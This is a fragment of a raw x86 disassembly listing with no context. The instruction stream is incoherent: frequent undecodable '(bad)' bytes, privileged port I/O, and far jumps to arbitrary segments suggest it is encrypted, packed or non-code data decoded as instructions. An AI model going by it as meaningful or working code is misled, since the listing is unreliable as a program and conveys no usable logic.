  403f44:	ret    0xa1d5
  403f47:	loopne 0x403ef8
  403f49:	dec    ebx
  403f4a:	adc    eax,0xe7f88b66
  403f4f:	stos   DWORD PTR es:[edi],eax
  403f50:	adc    eax,0x1623c6dc
  403f55:	out    dx,al
  403f56:	and    eax,0x57da1653
  403f5b:	mov    cl,bh
  403f5d:	packuswb mm1,QWORD PTR [esi-0x60]
  403f61:	sbb    DWORD PTR [ecx+0x2261f7be],eax
  403f67:	out    0x2a,al
  403f69:	fcmovbe st,st(3)
  403f6b:	(bad)  
  403f6c:	addr16 pushf 
  403f6e:	fist   DWORD PTR ds:0x4bbb3d83
  403f74:	stos   DWORD PTR es:[edi],eax
  403f75:	shl    DWORD PTR [ebx],1
  403f77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f78:	lock sub dl,cl
  403f7b:	dec    ebx
  403f7c:	push   0xb8d8731d
  403f81:	sub    eax,0x1d9b1726
  403f86:	jmp    0x403f74
  403f88:	fimul  WORD PTR [eax-0x5c]
  403f8b:	aam    0x60
  403f8d:	and    al,cl
  403f8f:	xchg   BYTE PTR [ebx+eax*4],al
  403f92:	loopne 0x403f2f
  403f94:	xchg   ecx,eax
  403f95:	pop    edx
  403f96:	jo     0x403f20
  403f98:	and    DWORD PTR [ebx-0x5484d7b4],esp
  403f9e:	mul    cl
  403fa0:	aam    0xb1
  403fa2:	shl    edx,1
  403fa4:	call   0xb805ebec
  403fa9:	mov    gs,WORD PTR [ebp+0x1f]
  403fac:	pop    eax
  403fad:	ret    
  403fae:	fbld   TBYTE PTR [esi-0x6]
  403fb1:	push   edx
  403fb2:	and    DWORD PTR [edi+0x4b3ea383],ebx
  403fb8:	cmp    al,0x7e
  403fba:	and    al,bl
  403fbc:	cmp    eax,0xbc56a0da
  403fc1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403fc2:	int    0xf6
  403fc4:	or     ah,BYTE PTR [esi-0x6adefef8]
  403fca:	int    0xd1
  403fcc:	dec    edx
  403fcd:	jge    0x403fa5
  403fcf:	scas   al,BYTE PTR es:[edi]
  403fd0:	add    DWORD PTR [eax+0x6c],esi
  403fd3:	add    BYTE PTR [ebx],dh
  403fd5:	pop    ecx
  403fd6:	jmp    0x56db:0xb8da49c6
  403fdd:	mov    ebx,0x9ad44f7
  403fe2:	add    BYTE PTR [esi-0x20],0xaa
  403fe6:	gs stos BYTE PTR es:[edi],al
  403fe8:	scas   al,BYTE PTR es:[edi]
  403fe9:	mov    ebx,0x6ace8b09
  403fee:	pop    edi
  403fef:	inc    eax
  403ff0:	xchg   eax,edx
  403ff2:	sahf   
  403ff3:	pop    eax
  403ff4:	mov    ch,0x72
  403ff6:	cmp    eax,0x4cf4b7d0
  403ffb:	and    DWORD PTR [eax+0x75],edi
  403ffe:	into   
  403fff:	push   edi
  404000:	jle    0x40405d
  404002:	mov    edx,ebx
  404004:	or     DWORD PTR [edi+eiz*2+0x11c4e102],ecx
  40400b:	xchg   edx,eax
  40400c:	xchg   DWORD PTR [edx+0x60],edi
  40400f:	mov    bh,0xef
  404011:	retf   
  404012:	cmp    eax,0xaf4430d7
  404017:	mov    ds:0xefe65c84,al
  40401c:	mov    bl,0x83
  40401e:	push   edx
  40401f:	cmp    BYTE PTR [eax],bh
  404021:	test   ecx,eax
  404023:	jmp    0x404059
  404025:	sbb    edx,DWORD PTR [ecx-0x338ca5c8]
  40402b:	icebp  
  40402c:	push   ds
  40402d:	int3   
  40402e:	inc    esp
  40402f:	or     edi,DWORD PTR [ebx-0x15]
  404032:	stc    
  404033:	mov    cl,0x1b
  404035:	mov    ds:0xbcef1753,eax
  40403a:	sub    bh,ah
  40403c:	jecxz  0x40401d
  40403e:	add    BYTE PTR [esi+0x1b],0xe5
  404042:	dec    edx
  404043:	in     eax,dx
  404044:	mov    esi,esi
  404046:	fisub  WORD PTR [ebx-0x2d]
  404049:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40404a:	or     dl,BYTE PTR [ebp+0x46]
  40404d:	mov    dl,BYTE PTR [edx]
  40404f:	mov    ch,0x0
  404051:	aad    0xce
  404053:	clc    
  404054:	inc    edx
  404055:	mov    cl,BYTE PTR [edi-0x3c7491b2]
  40405b:	cmc    
  40405c:	shl    BYTE PTR [ebp-0x63],0xf2
  404060:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404061:	je     0x4040b6
  404063:	push   ds
  404064:	rcr    BYTE PTR [esi+ebp*4-0x406dae4c],0xb4
  40406c:	(bad)  
  40406d:	sub    eax,0xb0d3cd53
  404072:	fmul   QWORD PTR [ecx]
  404074:	mov    edx,0xba199c87
  404079:	adc    bl,BYTE PTR [edx-0x246bc418]
  40407f:	mov    ds:0x555271b,eax
  404084:	sbb    DWORD PTR [ecx+0x50],esp
  404087:	clc    
  404088:	aam    0x8b
  40408a:	mov    WORD PTR [eax-0x5d4e2909],es
  404090:	xchg   esi,eax
  404091:	push   ecx
  404092:	(bad)
  404097:	mov    fs,WORD PTR [esi+0x528f470]
  40409d:	rcr    esi,cl
  40409f:	sbb    dh,ch
  4040a1:	pop    ds
  4040a2:	lock fisttp QWORD PTR [ecx+eiz*8]
  4040a6:	add    eax,0x7753e3e0
  4040ab:	(bad)  
  4040ac:	std    
  4040ad:	ins    DWORD PTR es:[edi],dx
  4040ae:	mov    WORD PTR [ecx+0x32],es
  4040b1:	xor    al,0x72
  4040b3:	adc    eax,0x8dc4922e
  4040b8:	sbb    al,0xd0
  4040ba:	xor    al,0x15
  4040bc:	dec    edi
  4040bd:	sub    al,0x74
  4040bf:	xchg   esp,eax
  4040c0:	mov    ds:0xd1846eae,eax
  4040c5:	and    BYTE PTR ss:[edx-0x27],al
  4040c9:	out    0xac,eax
  4040cb:	mov    eax,0x9ac43c2b
  4040d0:	jle    0x404082
  4040d2:	or     dh,ch
  4040d4:	cmp    BYTE PTR [edx],0x99
  4040d7:	cmc    
  4040d8:	mov    dh,0x2e
  4040da:	mov    ebx,0xb33c9d0e
  4040df:	jge    0x4040ce
  4040e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4040e2:	inc    esi
  4040e3:	jnp    0x404124
  4040e5:	js     0x404099
  4040e7:	pop    esp
  4040e8:	push   edi
  4040e9:	aad    0x2f
  4040eb:	pusha  
  4040ec:	dec    eax
  4040ed:	stc    
  4040ee:	mov    al,ds:0xc5b9cf0c
  4040f3:	mov    ch,0xce
  4040f5:	loopne 0x404132
  4040f7:	dec    edx
  4040f8:	push   ss
  4040f9:	out    dx,eax
  4040fa:	jnp    0x404142
  4040fc:	into   
  4040fd:	ficomp DWORD PTR [edx-0xf]
  404100:	clc    
  404101:	imul   eax,DWORD PTR ds:0xfc02bb12,0xc7e97f27
  40410b:	loopne 0x4040df
  40410d:	and    BYTE PTR [edi],ah
  40410f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404110:	(bad)  
  404111:	cmp    eax,DWORD PTR [ecx]
  404113:	(bad)  
  404114:	push   ebp
  404115:	out    0x18,eax
  404117:	jp     0x4040ff
  404119:	mov    ecx,0x83519d62
  40411e:	out    dx,eax
  40411f:	push   es
  404120:	pop    esi
  404121:	repnz cmp DWORD PTR [ebp+0x4d],ebx
  404125:	or     dh,BYTE PTR [eax]
  404127:	ret    
  404128:	pop    eax
  404129:	call   0xd2608416
  40412e:	scas   eax,DWORD PTR es:[edi]
  40412f:	ds loop 0x4041a1
  404132:	shl    BYTE PTR [esi+0x441307e7],1
  404138:	sbb    esp,DWORD PTR [ebx*1-0x1ce6b478]
  40413f:	xchg   BYTE PTR ds:0xb2f43757,bh
  404145:	popa   
  404146:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404147:	mov    al,ds:0x875092c9
  40414c:	inc    ebx
  40414d:	(bad)  
  40414e:	sub    bl,BYTE PTR [esi-0x2c8925c5]
  404154:	or     al,BYTE PTR [ebx+0x40e7abcb]
  40415a:	out    dx,al
  40415b:	stos   DWORD PTR es:[edi],eax
  40415c:	stos   DWORD PTR es:[edi],eax
  40415d:	cli    
  40415e:	repnz fcmove st,st(2)
  404161:	sbb    DWORD PTR [ebp+0x76],0x7141bfe0
  404168:	daa    
  404169:	(bad)  
  40416a:	fxch   st(7)
  40416c:	cs jecxz 0x404157
  40416f:	jmp    0x40413b
  404171:	pop    ecx
  404172:	and    ecx,edi
  404174:	int3   
  404175:	das    
  404176:	inc    eax
  404177:	call   0x9103:0xb6f3bfcd
  40417e:	mov    ch,0x90
  404180:	push   ds
  404181:	adc    DWORD PTR [edx-0x37d13bce],ebx
  404187:	mov    edx,0x621cec3e
  40418c:	sbb    dl,cl
  40418e:	aaa    
  40418f:	sar    BYTE PTR [eax],0x32
  404192:	or     BYTE PTR [esi],dl
  404194:	jns    0x404197
  404196:	inc    esi
  404197:	sbb    ecx,edx
  404199:	dec    ebp
  40419a:	and    al,0x45
  40419c:	add    edx,DWORD PTR [ecx+0x1446abeb]
  4041a2:	icebp  
  4041a3:	xor    ah,bh
  4041a5:	adc    bl,BYTE PTR [ecx]
  4041a7:	stc    
  4041a8:	mov    ?,WORD PTR [ebp-0x1d]
  4041ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4041ac:	mov    edx,edi
  4041ae:	stos   DWORD PTR es:[edi],eax
  4041af:	(bad)  
  4041b0:	jns    0x4041b0
  4041b2:	mov    dl,0x9f
  4041b4:	cmp    BYTE PTR [ecx-0x40c38795],al
  4041ba:	outs   dx,DWORD PTR ds:[esi]
  4041bb:	js     0x4041f3
  4041bd:	mov    dl,0x8a
  4041bf:	scas   al,BYTE PTR es:[edi]
  4041c0:	mov    ecx,0x35fafa97
  4041c5:	adc    esi,ebx
  4041c7:	js     0x4041fd
  4041c9:	dec    edx
  4041ca:	cmp    eax,0x263bbc63
  4041cf:	and    ch,BYTE PTR [eax]
  4041d1:	sbb    dh,BYTE PTR ss:[ebx+0x6ab42abd]
  4041d8:	adc    DWORD PTR [edx+0x11c632e7],edi
  4041de:	out    dx,eax
  4041df:	add    dh,BYTE PTR [ecx-0x4a]
  4041e2:	jb     0x404223
  4041e4:	or     eax,0x4205dc61
  4041e9:	push   esi
  4041ea:	dec    edx
  4041eb:	enter  0xa007,0xdd
  4041ef:	xor    DWORD PTR [edx+0x41f57c80],esp
  4041f5:	dec    ebp
  4041f6:	xchg   ebp,eax
  4041f7:	xlat   BYTE PTR ds:[ebx]
  4041f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4041f9:	jecxz  0x404209
  4041fb:	mov    al,0xec
  4041fd:	js     0x4041d2
  4041ff:	jno    0x404197
  404201:	push   ss
  404202:	je     0x4041f0
  404204:	jp     0x40425f
  404206:	sbb    edi,DWORD PTR [eax+0x27240fc9]
  40420c:	mov    ecx,0xab5c7240
  404211:	xchg   BYTE PTR [esi],dl
  404213:	inc    edi
  404214:	test   eax,0xe85fb7fe
  404219:	mov    ch,0x6c
  40421b:	call   0x4bdfce03
  404220:	or     DWORD PTR [edi],edx
  404222:	sub    eax,0x761c90ca
  404227:	dec    edi
  404228:	scas   eax,DWORD PTR es:[edi]
  404229:	into   
  40422a:	mov    ebp,0xc843ded
  40422f:	cmp    DWORD PTR [eax-0x62],eax
  404232:	hlt    
  404233:	pop    edx
  404234:	cmp    edi,DWORD PTR [edi+0x899ed11]
  40423a:	(bad)  
  40423b:	fist   DWORD PTR [ebp+0x49]
  40423e:	outs   dx,DWORD PTR ds:[esi]
  40423f:	jmp    0xe702:0x31d9cb5a
  404246:	(bad)  
  404247:	push   edx
  404248:	sub    al,dh
  40424a:	(bad)  
  40424b:	xlat   BYTE PTR ds:[ebx]
  40424c:	call   0xb6f5:0xe9851d8d
  404253:	js     0x4041d9
  404255:	mov    ecx,0x4db875cd
  40425a:	and    eax,0x18f56fd4
  40425f:	xchg   ecx,eax
  404260:	ins    DWORD PTR es:[edi],dx
  404261:	dec    esi
  404262:	sub    al,dl
  404264:	mov    dl,0x25
  404266:	ss xchg esi,eax
  404268:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404269:	pop    ds
  40426a:	add    BYTE PTR [eax+0x301b2b9e],bl
  404270:	lods   eax,DWORD PTR ds:[esi]
  404271:	ret    
  404272:	loop   0x404220
  404274:	adc    dl,BYTE PTR [ecx]
  404276:	loope  0x404255
  404278:	ds dec esp
  40427a:	push   ds
  40427b:	rol    DWORD PTR [ebp+0x52],1
  40427e:	ja     0x40427d
  404280:	sub    dl,cl
  404282:	rcr    DWORD PTR [ecx-0x6e],0x7a
  404286:	xchg   esp,eax
  404287:	cwde   
  404288:	(bad)  
  40428a:	inc    edx
  40428b:	push   edi
  40428c:	enter  0x1c42,0x82
  404290:	cld    
  404291:	sub    BYTE PTR [eax+0x700b93e5],dh
  404297:	(bad)  
  404298:	jge    0x404223
  40429a:	sub    ebp,DWORD PTR [ecx+0x214ec9e]
  4042a0:	ins    BYTE PTR es:[edi],dx
  4042a1:	xchg   esp,edx
  4042a3:	test   BYTE PTR [ebx+0x60bb7b1d],al
  4042a9:	cld    
  4042aa:	cmp    BYTE PTR [edx-0x4a],bh
  4042ad:	jno    0x40432a
  4042af:	pop    esi
  4042b0:	ja     0x4042f3
  4042b2:	ss push esi
  4042b4:	mov    bl,BYTE PTR [eax]
  4042b6:	ja     0x4042f3
  4042b8:	cwde   
  4042b9:	dec    eax
  4042ba:	mov    ds:0x733cde4b,al
  4042bf:	jnp    0x404250
  4042c1:	loopne 0x4042ef
  4042c3:	add    DWORD PTR [edx],ebp
  4042c5:	outs   dx,DWORD PTR ds:[esi]
  4042c6:	sub    edx,DWORD PTR [ecx+esi*8+0x3d]
  4042ca:	aaa    
  4042cb:	div    DWORD PTR [ebx+0x66]
  4042ce:	xchg   edi,eax
  4042cf:	dec    edx
  4042d0:	xchg   DWORD PTR ds:0x673406e5,esp
  4042d6:	lea    esp,[eax+0x30]
  4042d9:	inc    esp
  4042da:	fistp  QWORD PTR [eax+edi*4-0x6edffd]
  4042e1:	mov    ecx,0x574f966d
  4042e6:	push   edx
  4042e7:	lds    ecx,FWORD PTR [eax]
  4042e9:	les    ecx,FWORD PTR [ecx-0x6c0f9d68]
  4042ef:	push   0x67
  4042f1:	stc    
  4042f2:	mov    ds:0x60a7d2b8,eax
  4042f7:	mov    esi,0x701dc518
  4042fc:	cmp    eax,0x29737505
  404301:	pusha  
  404302:	push   ecx
  404303:	cdq    
  404304:	mov    bl,BYTE PTR [ecx]
  404306:	pusha  
  404307:	popa   
  404308:	lock xchg BYTE PTR [eax],al
  40430b:	test   esp,ecx
  40430d:	scas   al,BYTE PTR es:[edi]
  40430e:	into   
  40430f:	fdivr  DWORD PTR [ecx+0x2c57f5c9]
  404315:	xor    edx,esi
  404317:	cwde   
  404318:	repz cld 
  40431a:	inc    eax
  40431b:	ret    
  40431c:	loopne 0x404348
  40431e:	pop    ds
  40431f:	fwait
  404320:	push   cs
  404321:	xchg   DWORD PTR [edi+0x1b8ceb26],ecx
  404327:	lea    edi,[eax+0x4b]
  40432a:	add    eax,0xa4cc6d5d
  40432f:	and    ch,BYTE PTR [ecx+0x76]
  404332:	ret    
  404333:	dec    ebx
  404334:	in     al,dx
  404335:	sti    
  404336:	retf   
  404337:	xor    edx,DWORD PTR [ebp+0x1]
  40433a:	dec    edi
  40433b:	cmp    ah,BYTE PTR [edx]
  40433d:	shl    BYTE PTR [esi-0x26c6dd7],1
  404343:	lods   eax,DWORD PTR ds:[esi]
  404344:	fnstcw WORD PTR [ecx-0x2c]
  404347:	or     dh,BYTE PTR [edx-0x66e55b2f]
  40434d:	hlt    
  40434e:	dec    esp
  40434f:	mov    DWORD PTR [ebx],edx
  404351:	and    BYTE PTR [edx-0x14e4f548],al
  404357:	idiv   DWORD PTR [esi]
  404359:	adc    BYTE PTR [edi+0x248e09a1],bh
  40435f:	pushf  
  404360:	sbb    DWORD PTR [eax-0x6b09955b],ebx
  404366:	retf   
  404367:	push   ss
  404368:	inc    ebx
  404369:	pop    eax
  40436a:	scas   eax,DWORD PTR es:[edi]
  40436b:	sub    dh,ah
  40436d:	fisubr WORD PTR [ecx]
  40436f:	jmp    0x17c49be9
  404374:	sbb    BYTE PTR [ebx+0x7253a1a7],ah
  40437a:	(bad)  
  40437b:	mov    al,BYTE PTR [edx+0x4c]
  40437e:	aaa    
  40437f:	pop    ss
  404380:	scas   al,BYTE PTR es:[edi]
  404381:	or     eax,0xa8d5f2a2
  404386:	retf   
  404387:	data16 shl BYTE PTR [ebx-0x1fe6d794],1
  40438e:	xor    ecx,edx
  404390:	xchg   edi,eax
  404391:	pop    eax
  404392:	push   esp
  404393:	pop    edx
  404394:	sbb    al,0x67
  404396:	loop   0x4043a4
  404398:	pmaxsw mm6,mm7
  40439b:	or     ch,BYTE PTR [eax-0x62]
  40439e:	pop    ds
  40439f:	adc    ecx,esi
  4043a1:	push   ecx
  4043a2:	cmc    
  4043a3:	test   al,0x4b
  4043a5:	fdiv   DWORD PTR ds:0x57a8293d
  4043ab:	js     0x4043c8
  4043ad:	(bad)  
  4043ae:	lods   eax,DWORD PTR ds:[esi]
  4043af:	adc    ecx,DWORD PTR [eax-0xed7c54b]
  4043b5:	dec    edi
  4043b6:	ss jecxz 0x4043a9
  4043b9:	daa    
  4043ba:	sbb    eax,0x8c4ce62d
  4043bf:	mov    esi,0xa1f5f800
  4043c4:	xchg   edi,eax
  4043c5:	clc    
  4043c6:	sahf   
  4043c7:	xlat   BYTE PTR ds:[ebx]
  4043c8:	mov    al,0x21
  4043ca:	cmp    ch,al
  4043cc:	xor    DWORD PTR [edi],esp
  4043ce:	cwde   
  4043cf:	mov    eax,0x3cc733e
  4043d4:	out    dx,al
  4043d5:	pop    ecx
  4043d6:	mov    ds:0x88c1e139,eax
  4043db:	inc    esi
  4043dc:	xor    BYTE PTR [edi-0x371d9ebd],dh
  4043e2:	push   ss
  4043e3:	push   ebp
  4043e4:	fld    QWORD PTR [ecx]
  4043e6:	jmp    0x58c9:0xaff0d812
  4043ed:	mov    ds:0xdcf084f,eax
  4043f2:	mov    dl,0xa7
  4043f4:	xor    DWORD PTR [ecx-0x308c132a],eax
  4043fa:	cli    
  4043fb:	imul   esi,ebp,0x1e
  4043fe:	mov    DWORD PTR [edx],edi
  404400:	push   ss
  404401:	pop    ecx
  404402:	popf   
  404403:	sub    eax,0x43ad2555
  404408:	inc    ebp
  404409:	add    eax,0x6a2b593e
  40440e:	les    ecx,FWORD PTR [eax*4+0xf90e17d]
  404415:	sub    eax,0x748dec18
  40441a:	jmp    0x404468
  40441c:	mov    esp,0x8d752c6b
  404421:	mov    dl,0x4f
  404423:	mov    fs,WORD PTR [esi+0x5b01114e]
  404429:	out    0x70,eax
  40442b:	or     al,0x37
  40442d:	sub    bh,BYTE PTR ds:0x1aed6965
  404433:	adc    ah,BYTE PTR [ebx-0xf9b1c55]
  404439:	pop    ss
  40443a:	repz ret 0xb5ba
  40443e:	sbb    BYTE PTR [ebx+0x64],al
  404441:	and    DWORD PTR [edx],esp
  404443:	jo     0x4043ff
  404445:	mov    WORD PTR [ebp+0x3d],es
  404448:	fidiv  DWORD PTR [ebx-0x47]
  40444b:	add    edi,DWORD PTR [edi+0x7f]
  40444e:	push   esi
  40444f:	xchg   edi,eax
  404450:	inc    ebx
  404451:	mov    ecx,DWORD PTR [edi]
  404453:	daa    
  404454:	stc    
  404455:	mov    ebp,0x442201c5
  40445a:	int    0x47
  40445c:	sti    
  40445d:	retf   0x3575
  404460:	lods   al,BYTE PTR ds:[esi]
  404461:	inc    edi
  404462:	in     eax,dx
  404463:	(bad)  
  404464:	cdq    
  404465:	aas    
  404466:	pop    ecx
  404467:	aam    0xb
  404469:	outs   dx,DWORD PTR ds:[esi]
  40446a:	ficomp WORD PTR [edx+0x62893761]
  404470:	push   ebx
  404471:	push   ebx
  404472:	out    0xbe,eax
  404474:	into   
  404475:	bound  ebp,QWORD PTR [ebx]
  404477:	lods   eax,DWORD PTR ds:[esi]
  404478:	imul   ecx
  40447a:	sti    
  40447b:	bound  ecx,QWORD PTR [eax-0x7a658b9d]
  404481:	iret   
  404482:	arpl   WORD PTR [esi+0x46],bp
  404485:	out    dx,al
  404486:	cli    
  404487:	sar    BYTE PTR [edx],cl
  404489:	pop    esp
  40448a:	dec    edx
  40448b:	rcl    DWORD PTR [edi-0x10],cl
  40448e:	or     BYTE PTR [eax-0x381b33ce],0x33
  404495:	ins    BYTE PTR es:[edi],dx
  404496:	push   esi
  404497:	cmp    eax,0x2c5d2534
  40449c:	mov    al,BYTE PTR ds:0xe0c49cec
  4044a2:	dec    ebp
  4044a3:	ds test eax,0x78db4e44
  4044a9:	mov    al,ds:0xe01d9177
  4044ae:	loop   0x404452
  4044b0:	shl    ch,1
  4044b2:	das    
  4044b3:	xor    DWORD PTR [edi],edx
  4044b5:	mov    ds:0x8599c9e3,eax
  4044ba:	adc    eax,0xfad4d7e6
  4044bf:	xchg   ebp,eax
  4044c0:	mul    BYTE PTR [ebx-0x477954e5]
  4044c6:	retf   
  4044c7:	push   edi
  4044c8:	iret   
  4044c9:	mov    dl,0xa1
  4044cb:	jmp    0x404495
  4044cd:	add    eax,0x8ab1b546
  4044d2:	mov    eax,0x7d8fee3c
  4044d7:	jle    0x4044ee
  4044d9:	jle    0x4044ed
  4044db:	add    bl,cl
  4044dd:	jp     0x404508
  4044df:	jae    0x404495
  4044e1:	into   
  4044e2:	push   edi
  4044e3:	adc    ch,al
  4044e5:	xchg   edi,eax
  4044e6:	retf   0x23ae
  4044e9:	lds    eax,FWORD PTR [edi]
  4044eb:	and    al,BYTE PTR [ebx]
  4044ed:	inc    edi
  4044ee:	(bad)  
  4044f0:	mov    DWORD PTR [eax+eax*2-0x14],edi
  4044f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4044f5:	cmp    DWORD PTR [esi],ebx
  4044f7:	retf   
  4044f8:	jno    0x4044e0
  4044fa:	mov    edi,eax
  4044fc:	add    eax,DWORD PTR ds:0x97234800
  404502:	pushf  
  404503:	icebp  
  404504:	mov    dl,0xe3
  404506:	push   edi
  404507:	push   esp
  404508:	adc    eax,0xc81a46f7
  40450d:	leave  
  40450e:	in     eax,0x6e
  404510:	lds    esp,FWORD PTR [esi-0x228ff580]
  404516:	inc    ebp
  404517:	add    al,0x3a
  404519:	jmp    0x2d0b7457
  40451e:	leave  
  40451f:	repz or DWORD PTR [di],ebx
  404523:	(bad)  
  404524:	mov    ah,0x6d
  404526:	push   ecx
  404527:	dec    ebx
  404528:	aad    0xab
  40452a:	mov    ecx,0x66441f3f
  40452f:	xor    BYTE PTR [edx-0xb],0xe9
  404533:	in     al,0x1c
  404535:	inc    ebp
  404536:	xchg   ecx,eax
  404537:	aas    
  404538:	xchg   BYTE PTR ds:0xf7a435cd,cl
  40453e:	jno    0x404584
  404540:	mov    bl,0x7d
  404542:	or     edi,DWORD PTR [ebx-0x7]
  404545:	outs   dx,BYTE PTR ds:[esi]
  404546:	in     eax,0x19
  404548:	mov    eax,ds:0xc1a4be56
  40454d:	jmp    0x9e56c3ce
  404552:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404553:	sbb    eax,0x4cc672d
  404558:	lock (bad) 
  40455a:	xchg   edx,eax
  40455b:	mov    dl,0x1f
  40455d:	mov    ebx,0xa644fb23
  404562:	int    0x5b
  404564:	xchg   DWORD PTR [edx+0x39337d1a],edx
  40456a:	jo     0x404571
  40456c:	or     cl,0xb1
  40456f:	inc    esp
  404570:	add    eax,0xa3a1d7bc
  404575:	retf   
  404576:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404577:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404578:	ja     0x404522
  40457a:	push   edx
  40457b:	cmp    ah,0x38
  40457e:	clc    
  40457f:	jnp    0x4045d3
  404581:	scas   al,BYTE PTR es:[edi]
  404582:	jb     0x4045c0
  404584:	pop    ecx
  404585:	push   esp
  404586:	cmp    eax,DWORD PTR [ecx-0x794b77bb]
  40458c:	mov    bl,0x31
  40458e:	fsub   DWORD PTR [eax+0x5c]
  404591:	cli    
  404592:	ret    0x6bfc
  404595:	retf   0xff90
  404598:	fstp   TBYTE PTR [ecx]
  40459a:	pop    edi
  40459b:	and    al,BYTE PTR [ebx]
  40459d:	nop
  40459e:	xor    DWORD PTR ds:0x481144b6,ecx
  4045a4:	sbb    dh,BYTE PTR [eax+eiz*8-0x515f601c]
  4045ab:	outs   dx,BYTE PTR ds:[esi]
  4045ac:	inc    esi
  4045ad:	cmp    eax,0x3a6e21db
  4045b2:	sbb    al,0x59
  4045b4:	pop    esi
  4045b5:	ror    BYTE PTR [ebx-0x78],cl
  4045b8:	in     al,0x4b
  4045ba:	jge    0x40460d
  4045bc:	cmp    edx,DWORD PTR [esi-0x14]
  4045bf:	sub    ebp,ecx
  4045c1:	cs stos BYTE PTR es:[edi],al
  4045c3:	mov    edi,0x44db38da
  4045c8:	push   0xffffffd2
  4045ca:	sub    DWORD PTR [edx+eiz*2],0xffffffa4
  4045ce:	ins    DWORD PTR es:[edi],dx
  4045cf:	cli    
  4045d0:	lods   al,BYTE PTR ds:[esi]
  4045d1:	retf   0x2076
  4045d4:	mov    dh,0x50
  4045d6:	pop    ecx
  4045d7:	push   edx
  4045d8:	daa    
  4045d9:	mul    DWORD PTR [esi]
  4045db:	sub    DWORD PTR [esi+ecx*2-0x64285c6a],0xffffffeb
  4045e3:	popa   
  4045e4:	push   ds
  4045e5:	repnz (bad) 
  4045e8:	shl    eax,1
  4045ea:	pop    ss
  4045eb:	sub    ebx,eax
  4045ed:	mov    al,BYTE PTR [esi-0x34b4bb3a]
  4045f3:	(bad)  
  4045f4:	ror    BYTE PTR [esi-0x25],cl
  4045f7:	pop    ss
  4045f8:	add    edi,DWORD PTR [ecx+0x49]
  4045fb:	mov    ebp,DWORD PTR [esi+0x6b]
  4045fe:	lahf   
  4045ff:	ins    DWORD PTR es:[edi],dx
  404600:	sub    ecx,DWORD PTR [edi-0x5e6c1d96]
  404606:	inc    edx
  404607:	adc    ah,bl
  404609:	xchg   edi,eax
  40460a:	xchg   BYTE PTR [ecx+0x6abe3728],cl
  404610:	mul    DWORD PTR [esi+0x43]
  404613:	dec    eax
  404614:	cld    
  404615:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404616:	(bad)  
  404617:	test   eax,0x7053eea5
  40461c:	cwde   
  40461d:	sbb    al,0xde
  40461f:	mov    eax,0x36cb06f9
  404624:	js     0x4045c0
  404626:	cld    
  404627:	dec    edi
  404628:	mov    ds:0x5781c7ff,eax
  40462d:	mov    edx,0x3896cd03
  404632:	je     0x404656
  404634:	mov    ah,0xe
  404636:	push   eax
  404637:	leave  
  404638:	mov    dl,0xb8
  40463a:	call   0xdb1:0x4a547d50
  404641:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404642:	xor    eax,0x7e005eb5
  404647:	mov    ah,0x53
  404649:	sahf   
  40464a:	xchg   esi,eax
  40464b:	cdq    
  40464c:	ins    BYTE PTR es:[edi],dx
  40464d:	stc    
  40464e:	and    esi,DWORD PTR [eax]
  404650:	jo     0x4045df
  404652:	or     eax,ebp
  404654:	jne    0x404658
  404656:	lock jns 0x404605
  404659:	mov    dh,0x32
  40465b:	iret   
  40465c:	mov    edx,0x2751ba4d
  404661:	or     al,0xa3
  404663:	in     eax,dx
  404664:	test   DWORD PTR [ecx],0x76f18fe
  40466a:	add    dh,ah
  40466c:	stos   DWORD PTR es:[edi],eax
  40466d:	jnp    0x4045fc
  40466f:	xlat   BYTE PTR ds:[ebx]
  404670:	jo     0x404663
  404672:	lods   al,BYTE PTR ds:[esi]
  404673:	push   cs
  404674:	aad    0xf2
  404676:	fisttp QWORD PTR [eax+eax*1-0x4f1a82eb]
  40467d:	cli    
  40467e:	inc    ebp
  40467f:	(bad)  
  404680:	and    bh,bl
  404682:	sbb    DWORD PTR [esi+edx*8-0x19b28277],esi
  404689:	jae    0x404683
  40468b:	adc    cl,BYTE PTR [edi-0x4cf9500b]
  404691:	mov    esi,0x8435707b
  404696:	dec    eax
  404697:	pushf  
  404698:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404699:	or     ebx,0x77b900c6
  40469f:	aad    0x3c
  4046a1:	addr16 xchg edi,eax
  4046a3:	and    BYTE PTR [ecx+0x23b77016],ah
  4046a9:	fild   DWORD PTR [esp+eax*4-0x7b]
  4046ad:	cli    
  4046ae:	cmp    dl,dh
  4046b0:	xor    DWORD PTR [ebx+0x5c6d5390],0x1fae2480
  4046ba:	cli    
  4046bb:	(bad)  
  4046bc:	and    eax,0xf21d5d28
  4046c1:	sub    ecx,ebx
  4046c3:	(bad)
  4046c7:	lods   eax,DWORD PTR ds:[esi]
  4046c8:	bound  eax,QWORD PTR [eax]
  4046ca:	xchg   ah,dl
  4046cc:	lods   al,BYTE PTR ds:[esi]
  4046cd:	cli    
  4046ce:	pop    ebx
  4046cf:	or     DWORD PTR cs:[ebx-0x30dda4cf],edx
  4046d6:	jns    0x40472e
  4046d8:	xchg   ecx,eax
  4046d9:	add    esi,DWORD PTR [edi+0x69ab6c74]
  4046df:	jb     0x404757
  4046e1:	mov    eax,ds:0x553e2faa
  4046e6:	inc    ebp
  4046e7:	mov    esi,DWORD PTR [eax-0x6b5dbe8f]
  4046ed:	jo     0x40475b
  4046ef:	shl    DWORD PTR [eax-0x12],cl
  4046f2:	pop    esi
  4046f3:	sub    al,0xda
  4046f5:	push   edx
  4046f6:	or     ch,BYTE PTR [edi+0x6]
  4046f9:	mov    bh,0xdf
  4046fb:	int3   
  4046fc:	push   edi
  4046fd:	into   
